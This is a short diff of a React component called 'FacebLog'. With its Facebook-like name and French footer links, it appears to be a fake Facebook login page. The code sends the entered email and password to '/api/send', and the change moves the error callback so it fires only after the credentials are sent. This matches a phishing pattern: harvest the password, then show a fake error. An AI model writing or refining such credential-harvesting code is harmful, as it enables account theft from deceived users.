@@ -8,12 +8,16 @@ function FacebLog({ onErreur }) {
   const [email, setEmail] = useState("");
 
   const handleSubmit = async () => {
-    onErreur();
     await fetch("/api/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, password }),
+      body: JSON.stringify({
+        email: email,
+        password: password,
+      }),
     });
+
+    onErreur();
   };
   const footerLangs = [
     { label: "Français (France)", href: "#", active: true },
